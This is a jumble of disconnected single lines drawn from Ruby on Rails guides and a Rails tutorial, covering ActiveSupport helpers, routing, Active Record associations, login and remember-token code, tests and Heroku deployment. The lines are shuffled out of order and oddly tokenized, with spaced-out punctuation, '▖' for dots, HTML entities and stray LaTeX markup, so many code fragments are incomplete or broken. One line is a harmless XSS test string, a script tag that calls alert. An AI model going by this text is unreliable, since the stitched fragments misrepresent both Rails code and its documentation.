&quot; foo \ n \ t \ tbar &quot; ▖ indent ( 2 ) # = &gt; &quot; \ t \ tfoo \ n \ t \ t \ t \ tbar &quot;
The second step is then to use an \ kode { authenticate } method to verify that the user has the given password .
# # # # `to _ date` , `to _ time` , `to _ datetime`
If the cached data refers to a constant that is unknown at that point , the autoloading mechanism is triggered and if it succeeds the deserialization is retried transparently .
To include `http : / / example ▖ com / main ▖ css` :
As a result , the one line
By testing the relevant value of the \ kode { params } hash , we can now remember or forget the user based on the value of the submission
If you &apos;re comfortable using an IDE , I suggest taking a look at the options mentioned to see what fits with the way you work .
In particular , because hashes return \ kode { nil } for nonexistent keys , code like
╼ &gt; &gt; @ user = @ user &#124; &#124; &quot; the user &quot;
It will also create the `preview _ photo _ url` and `preview _ photo _ path` helpers .
&#124; HTTP Verb &#124; Path &#124; Controller # Action &#124; Named Helper &#124;
t ▖ datetime : appointment _ date
as seen in Listing ~ \ ref { code : user _ model _ password _ reset _ expired } .
&#124; ` { &quot; person &quot; : &#91; &#93; } ` &#124; ` { : person = &gt; nil } ` &#124;
* As this is a standard call to `image _ tag` you can pass in an options hash ╼ after the attachment URL as you could for any other image :
Content-Type : text / html
Article ▖ where ( author : author )
adapter : jdbcmysql
Use the idioms recommended in edge .
# first element was not duplicated , it will be changed in both arrays
If you didn &apos;t do that exercise , update your Users helper file with the contents of Listing ~ \ ref { code : gravatar _ option _ redux } before proceeding .
hash = { a : 1 , b : 2 } ▖ with _ indifferent _ access
get : index

The User model for the toy application .
The result appears in Listing ~ \ ref { code : remember _ token _ should _ not _ be _ blank }
Most associations with standard names will be supported .
# # # Walkthrough to Generating a Mailer
Now that we &apos;ve replaced the variable part of the page titles with ERb , each of our pages looks something like this :
# # # # select _ date
With this declaration , all of the views in the entire application will use `app / views / layouts / main ▖ html ▖ erb` for their layout .
# Returns the user corresponding to the remember token cookie .
to read
gem &apos; mysql2&apos;
Meanwhile , the second line of \ kode { remember } uses the \ kode { update \ _ attribute } method to update the remember digest ▖ (
Rails also adapts rapidly to new developments in web technology and framework design .
# # # Understanding `yield`

In addition , sometimes the test database gets corrupted and needs to be reset .
use \ kode { let } a second time , and also use the \ kode { specify } method .
`params` will be ` { controller : &apos; photos &apos; , action : &apos; show &apos; , id : &apos; 1&apos; , user _ id : &apos; 2&apos; } ` .
This is why the code
$ git fetch rails

Using a digest for password resets is thus essential .
# # # # Linking to Images with the `image _ tag`
Finally , we &apos;ll add a custom stub view for the signup page ( Listing ~ \ ref { code : initial _ signup _ page } ) .
( If you have RVM installed , you should run
```apache
See &quot; Following users &quot; for the full implementation .
Since `adapter` is duplicate , the `ENV &#91; &apos; DATABASE _ URL &apos; &#93; ` connection information wins .
When you assign an object to a `has _ many` association , that object is automatically saved ( in order to update its foreign key ) .
$ git push heroku
dup &#91; : b &#93; &#91; : d &#93; &lt; &lt; 5
Like all of the other components of an engine , the assets should be namespaced ▖ ╼
You can also help out by examining pull requests that have been submitted to Ruby on Rails via GitHub .
These are \ emph { system } setups , meaning you only have to do them once per computer :
# # # Using the `content _ for` Method
The User model returns the list of users to the controller .
The secure password source code has a line for this as well :
We can get started by generating a template test , which we &apos;ll call \ kode { site \ _ layout } :
first ▖ last @ foo ▖ jp
and got the result shown in Figure ~ \ ref { fig : activated _ user } .
* `ActiveSupport : : Logger ▖ silencer` is set to `false` to disable the ability to silence logging in a block .
&quot; Product &quot; ▖ demodulize # = &gt; &quot; Product &quot;
This will find all clients created yesterday by using a `BETWEEN` SQL statement :
# # # # Configuring an SQLite3 Database for JRuby Platform
Adding a factory for administrative users .
# # # Sanity Check
We need to make two changes before the form in Listing ~ \ ref { code : micropost _ form } will work .

a2 ▖ x # = &gt; 2 , overridden in a2
&#91; Proc ▖ new { &#124; filename , path &#124; path = ~ / app \ / assets / &amp; &amp; !
Doing so can lead to orphaned records in your database .
in Listing ~ \ ref { code : real _ account _ activation _ test } .
The \ kode { has \ _ many } method takes several optional arguments , including the object class name and the foreign key .
( We &apos;ll see many others in the chapters ahead ▖ )
If there was no `where` condition , this would generate the normal set of two queries .
create app / assets / javascripts / application ▖ js
belongs _ to : physician
* `active _ support ▖ initialize _ beginning _ of _ week` Sets the default beginning of week for the application based on `config ▖ beginning _ of _ week` setting , which defaults to ` : monday` .
# # # Using a String with ` : if` and ` : unless`
This directory contains one file , `bin / rails` , which enables you to use the ╼ `rails` sub-commands and generators just like you would within an application ▖ ╼
# Replace ActionDispatch : : ShowExceptions with Lifo : : ShowExceptions
Hashes are essentially arrays that aren &apos;t limited to integer indices .
As with the `welcome` controller , we will need to add a route so that Rails ╼ knows where we would like to navigate to see `comments` .
We &apos;ll start , as usual , with our tests .
Choose these in certain , specific cases .
config ▖ action _ dispatch ▖ default _ headers ▖ clear
Active Record provides the ` : inverse _ of` option so that you can inform it of these relations :
so its output is ready to be used in a query string .
# # # # Durations
This migration can be simplified by using the `t ▖ references` form :
get &apos; photos / : id &apos; , to : &apos; photos # show&apos;
update user with id \ kode { 1 }
&lt; option value = &quot; 1 &quot; &gt; Egypt &lt; / option &gt;
contains a \ emph { default } argument , which in this case is the empty string .
For instance :
The user \ kode { update } action .
To check your Rails installation , run the following command to print out the version number :
The method `present ? ` is equivalent to ` ! blank ? ` .
And the following in your routes file :
# # # Live Compilation
The method `parameterize` normalizes its receiver in a way that can be used in pretty URLs .
It is beyond the scope of this guide to inform you on how to secure your application code and environments .
The reason is not Factory Girl &apos;s fault , and in fact it is a \ emph { feature } , not a bug .
A method called on an instance , such as \ kode { length } , is called an \ emph { instance method } .
With this change , you can access an instance of the ` @ products` collection as the `item` local variable within the partial .
Default Headers
If you submit the form again now , Rails will complain about not finding the ╼ `show` action .
Here both the directory name and filename are important .
# # # # # ` : as`
See the RailsCast on `` \ href { http : / / railscasts ▖ com / episodes / 77-destroy-without-javascript } { Destroy Without JavaScript } &apos; &apos; for details .
At this point , our application---with an important caveat---enforces email uniqueness , and our test suite should pass :
Using the `new` method , an object can be instantiated without being saved :
# # # # # `DateTime ▖ current`
The problem here is that we are missing an underlying abstraction .
To see what these parameters ╼ look like , change the `create` action to this :
User ▖ find _ each ( batch _ size : 5000 ) do &#124; user &#124;
We then redirect to the root URL with an informative flash message .
The \ href { http : / / gravatar ▖ com / } { Gravatar } image-cropping interface , with a picture of \ href { http : / / www ▖ michaelhartl ▖ com / } { some dude } .
Your scope can take arguments :
A failing test for validation of the \ kode { name } attribute .
Now let &apos;s add some links to ╼ navigate through pages .
Revisiting strong parameters

Hi , Mr ▖ &lt; % puts &quot; Frodo &quot; % &gt;
The Rails routes , with a new rule for Microposts resources .
This is the middleware which supports the PUT and DELETE HTTP method types .
Consider asking someone from the core team or author of the code before removing it .
Because of the heavy lifting ahead , it &apos;s especially important to review where we &apos;re going .
Previously it raised `ActiveRecord : : AssociationTypeMismatch` for such arguments .
We can accomplish this as follows :
as shown in Listing ~ \ ref { code : close _ route } .
1234567890 ▖ to _ s ( : human ) # = &gt; &quot; 1 ▖ 23 Billion &quot;
We &apos;ll start by visiting the signup path using \ kode { get } :
Because the application code was already working , this test should be \ linebreak \ passing :
\ label { cha : rails _ flavored _ ruby }
NOTE : The actual action names aren &apos;t changed by this option .
If you encounter such an issue , ensure that you &apos;re not attempting to call the ╼ application &apos;s routing methods without the `main _ app` prefix from within the ╼ engine .
Routes for static pages .
If `config ▖ cache _ classes` is true , this option is ignored .
&#124; &#124; 306 &#124; : reserved &#124;
In the case of web applications , the ``domain logic &apos; &apos; typically consists of data models for things like users , articles , and products , and the GUI is just a web page in a web browser .
You ╼ can request the headers from both your server and your CDN to verify they are ╼ the same :
Write an integration test for the expired password reset branch in Listing ~ \ ref { code : password _ reset _ update _ action } by filling in the template shown in Listing ~ \ ref { code : password _ reset _ expire _ test } .

# ruby-gemset = railstutorial _ rails _ 4 _ 0
Generally , security fixes and bug fixes are good candidates for a backport , while new features and patches that introduce a change in behavior will not be accepted .
To see how this works , we &apos;ll complete the user edit feature using test-driven development .
The first thing to generate for a blog engine is the `Article` model and related ╼ controller .
When you declare a `belongs _ to` association , you need to create foreign keys as appropriate .
Partial Layouts
Users can be updated using an edit form , which sends a \ texttt { PATCH } request to the \ kode { update } action .
A summary of the default Rails directory structure .
Instead , we now redirect to the root URL .
If no argument is passed a call generates a sorted series of key / value assignments calling `to _ query ( key ) ` on its values .

We can upload and resize images using CarrierWave .

Taken together , the material in Chapter ~ \ ref { cha : modeling _ users } through Chapter ~ \ ref { cha : password _ reset } develops a full Rails login and authentication system .
Records returned with additional attributes will always be read-only , because Rails cannot save changes to those attributes .
* In Rails 4 ▖ 0 when a column or a table is renamed the related indexes are also renamed .

Finally , we need to make a so-called \ kode { Procfile } to tell Heroku to run a Puma process in production , as shown in Listing ~ \ ref { code : procfile } .

If you set the ` : validate` option to `true` , then associated objects will be validated whenever you save this object .
umerate } ╼ ╼ % subsection sample _ users ( end ) ╼ ╼ \ subsection { Pagination } % ( fold ) ╼ \ label { sec : pagination } ╼ ╼
If you have an instance of a model to render into a partial , you can use a shorthand syntax :
By default it &apos;s set to false , which means that remote forms will not include `authenticity _ token` , which is helpful when you &apos;re fragment-caching the form .
A mockup of the user index with delete links ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ index _ delete _ links _ mockup _ bootstrap-full ▖ png } { ( full size ) }

The `has _ and _ belongs _ to _ many` association supports these options :
&lt; script &gt; alert ( &apos; Hello ! &apos; )
If you &apos;re using Git for version control , I suggest making a topic branch as usual :
# SELECT &quot; users &quot; .
unless value = ~ / \ A ( &#91; ^ @ \ s &#93; + ) @ ( ( ? : &#91; -a-z0-9 &#93; + \ ▖ ) + &#91; a-z &#93; { 2 , } ) \ z / i
We &apos;ll start by adding a delete link for each user on the users index page , restricting access to administrative users .
The development dependencies for the gem will only be used ╼ when the tests for the engine are running .
* FROM &quot; users &quot; WHERE &quot; users &quot; ▖ &quot; state &quot; = &apos; pending &apos; AND &quot; users &quot; ▖ &quot; state &quot; = &apos; active&apos;
The alternative---deploying only after laborious effort sealed away in a development environment---often leads to terrible integration headaches when launch time comes

Creates a text input area ; use a textarea for longer text inputs such as blog posts or descriptions .

You can now run the tests as you did for `sqlite3` .
Finally , note that Listing ~ \ ref { code : signup _ with _ account _ activation _ test } restores the lines we commented out in Listing ~ \ ref { code : comment _ out _ failing _ tests } .
The rest of this section is dedicated to taking a whirlwind tour through these user pages .
To avoid this inconvenience , we can use \ href { https : / / github ▖ com / guard / guard } { \ emph { Guard } } to automate the running of the tests .
As you get more comfortable with testing , you might find that it &apos;s useful to write integration tests before writing the application code instead of after .
For CSS files , this is done by removing whitespace and comments .
Ruby also has an explicit return option ; the following function is equivalent to the one above :
as shown in Listing ~ \ ref { code : user _ model _ forget } .

You are not free to use just any name for your associations .

Action Mailer handles the auto encoding of multibyte characters inside of ╼ headers and bodies .

To define one , open ╼ `app / models / blorgh / article ▖ rb` and add this line into the model :
listing } ╼ ╼ \ subsection { Login with remembering } % ( fold ) ╼ \ label { sec : login _ with _ remembering } ╼ ╼
All that remains is to add a social layer by letting users follow each other .
Destroying a session ( user logout ) .
We &apos;ll get the test to pass using a Rails method called \ kode { default \ _ scope } , which among other things can be used to set the default order in which elements are retrieved from the database .
to this code :
For example , the file cache store deserializes this way :
╼ $ rake db : migrate VERSION = 0
end { enumerate } ╼ ╼ % subsection the _ flash ( end ) ╼ ╼ \ subsection { The first signup } % ( fold ) ╼ \ label { sec : the _ first _ signup } ╼ ╼
&#124; &#124; 502 &#124; : bad _ gateway &#124;
as shown in Listing ~ \ ref { code : relationships _ migration } .
We &apos;ll also plan to make actions for a Home page , a Help page , and an About page , designated by the lower-case action names \ kode { home } , \ kode { help } , and \ kode { about } .
A test for a valid ( nonblank ) remember token .
/ microposts
We can get started by generating a template test , which we &apos;ll call \ kode { site \ _ layout } :
In this case , we want to both allow and require the `title` and ╼ `text` parameters for valid use of `create` .
# # # Active Support Within a Ruby on Rails Application
We &apos;ll start by adding a ``globally recognized avatar &apos; &apos; , or \ href { http : / / gravatar ▖ com / } { Gravatar } , to the user profile

This method accepts * * no * * arguments .
This shows how to run one ( and only one ) test file using the argument \ kode { TEST } and the full path to the file .
render xml : photo , location : photo _ url ( photo )
It stands to reason that , if a user is destroyed , the user &apos;s microposts should be destroyed as well .
# # # # Using Partials to simplify Views

An improved \ kode { README } file for the sample app .
The User mailer test generated by Rails .

When making a change of this nature , it &apos;s a good practice to write an \ emph { automated test } to verify that the feature is implemented correctly .
Once you &apos;re satisfied with your solutions , you can push up the exercises branch to a remote repository ( if you &apos;ve set one up ) :
# gem &apos; guard-spork &apos; , &apos; 1 ▖ 5 ▖ 0&apos;
Here I &apos;ve used \ kode { number } in place of ~ \ kode { i } just to emphasize that any variable name will do .
Our first step toward a working signup form is adding the code in Listing ~ \ ref { code : first _ create _ action } .
# # # `deep _ dup`
You can also use various finder methods on a relation for performing complex calculations :
This is because after redirects the HTTP standard technically requires a full URL , although in most browsers it will work either way .
Naturally , \ kode { first } just returns the first user in the database .
# # # config / initializers / session _ store ▖ rb
* * ` : batch _ size` * *
We &apos;re only concerned with the behavior experienced when using the full default ╼ Rails stack .
* * `ActionDispatch : : Callbacks` * *
create app / views / blorgh / articles / show ▖ html ▖ erb
&lt; % = yield % &gt;
Remove the duplicated form code by refactoring the \ kode { new ▖ html ▖ erb } and \ kode { edit ▖ html ▖ erb } views to use the partial in Listing ~ \ ref { code : new _ edit _ partial } .
physician ▖ patients = patients
def create
The default \ kode { ▖ gitignore } created by the \ kode { rails } command .

Action Mailer supports both plain-text and HTML mail .
X = 1
When hashes are the \ emph { last } argument in a function call , the curly braces are optional , so these two are equivalent :
as seen in Listing ~ \ ref { code : demo _ microposts _ resource } .
By following along with this guide , you &apos;ll create a Rails project called ╼ `blog` , a ( very ) simple weblog .
which we saw before in Section ~ \ ref { sec : the _ finished _ signup _ form } .
We &apos;ll also plan to make actions for a Home page , a Help page , and an About page .
Ordering the microposts with \ kode { default \ _ scope } .
The HTML shim takes up three lines and uses weird IE-specific syntax , so it would be nice to tuck it away somewhere on its own .
One important caveat is that `default _ scope` will be prepended in ╼ `scope` and `where` conditions .
Note that we &apos;ve added a link to the signup page for convenience .
* `image-path ( &quot; rails ▖ png &quot; ) ` becomes ` &quot; / assets / rails ▖ png &quot; ` .
╼ end
Calling `dup` or `clone` on safe strings yields safe strings .
* `find _ last _ by _ ▖ ▖ ▖ ` becomes `where ( ▖ ▖ ▖ ) ▖ last` .
as shown in Listing ~ \ ref { code : generated _ user _ mailer _ previews } .
This means that we should remove \ kode { : user \ _ id } from the \ kode { attr \ _ accessible } list , and once we do , the code above will fail .
We can eliminate these sources of duplication by telling RSpec that \ kode { page } is the \ emph { subject } of the tests using
self ▖ author = Blorgh ▖ author _ class ▖ constantize ▖ find _ or _ create _ by ( name : author _ name )
The method `to _ xml` returns a string containing an XML representation of its receiver :
The `delete` routing method should be used for routes that destroy ╼ resources .
as shown in Listing ~ \ ref { code : comment _ out _ footer } .
There is no consistent site styling or navigation .
With the \ kode { create } action defined in Listing ~ \ ref { code : log _ in _ success } , the login form defined in Listing ~ \ ref { code : login _ form } should now be working .
Alternatively , if `return` is preferred it is recommended to explicitly define ╼ a method :
# # # # # `utc ?
╼ ╼ % section introduction ( end ) ╼ ╼ \ section { Up and running } % ( fold ) ╼ \ label { sec : up _ and _ running } ╼ ╼
It does not assume that you have any prior experience ╼ with Rails .
Switched to a new branch &apos; modify-README&apos;

To get it to \ passing , just uncomment the before filter ( Listing ~ \ ref { code : uncommented _ before _ filter } ) .
